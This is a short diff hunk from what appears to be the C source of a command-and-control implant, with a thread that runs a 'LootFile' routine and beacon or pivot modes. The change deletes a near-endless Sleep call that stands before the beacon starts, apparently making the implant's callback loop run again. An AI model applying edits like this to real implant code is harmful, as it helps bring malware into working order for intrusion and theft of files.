@@ -3040,7 +3040,6 @@ VOID Final(VOID)
 		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LootFile, pGlobalConfig, 0, &dwThreadId);
 	}
 	
-	Sleep(1000000000);
 	if (pGlobalConfig->Type == Beacon || pGlobalConfig->Type == Pivot) {
 		pBeaconClient = BeaconInit(pGlobalConfig);
 		BeaconMainLoop(pBeaconClient);
